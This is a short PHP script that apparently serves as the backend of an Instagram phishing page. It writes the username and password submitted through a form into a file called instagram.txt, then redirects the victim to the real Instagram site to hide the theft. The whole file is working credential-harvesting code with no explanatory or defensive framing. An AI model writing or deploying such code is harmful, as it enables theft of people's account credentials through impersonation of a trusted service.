<?php

file_put_contents("../datas/instagram.txt", "Account: " . $_POST['username'] . " \nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
